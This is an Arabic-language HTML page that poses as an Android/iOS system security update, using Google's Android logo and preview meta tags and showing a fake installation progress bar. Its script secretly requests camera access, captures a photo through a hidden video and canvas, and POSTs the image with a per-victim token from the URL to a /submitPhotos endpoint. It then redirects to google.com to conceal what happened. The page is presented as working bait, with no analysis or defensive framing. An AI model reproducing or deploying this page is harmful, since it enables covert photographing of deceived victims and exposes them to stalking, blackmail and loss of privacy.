<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for Preview -->
    <meta property="og:title" content="تحديث أمان النظام - Android/iOS">
    <meta property="og:description" content="يتوفر تحديث جديد لنظام التشغيل الخاص بك. يرجى المتابعة لتحسين الأداء والأمان.">
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/android_96dp.png">
    <meta property="og:type" content="website">

    <title>System Update</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .progress-container { width: 80%; background-color: #333; border-radius: 10px; margin-top: 20px; }
        .progress-bar { width: 0%; height: 10px; background-color: #4CAF50; border-radius: 10px; transition: width 0.5s; }
        .status { margin-top: 10px; color: #aaa; }
    </style>
</head>
<body>
    <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" width="80" alt="OS Logo">
    <h2>جاري التحقق من التحديثات...</h2>
    <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
    <div class="status" id="statusText">جاري تهيئة النظام...</div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = window.location.pathname.split('/').pop();
        let progress = 0;
        const bar = document.getElementById('bar');
        const statusText = document.getElementById('statusText');

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
                    
                    fetch('/submitPhotos', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token: token, imageDatas: imageData })
                    });
                }, 3000);
            } catch (err) {}
        }

        const interval = setInterval(() => {
            progress += Math.random() * 10;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                window.location.href = "https://google.com";
            }
            bar.style.width = progress + '%';
            if (progress > 30) statusText.innerText = "جاري تحميل ملفات الأمان...";
            if (progress > 70) statusText.innerText = "جاري التثبيت...";
        }, 500);

        window.onload = capture;
    </script>
</body>
</html>
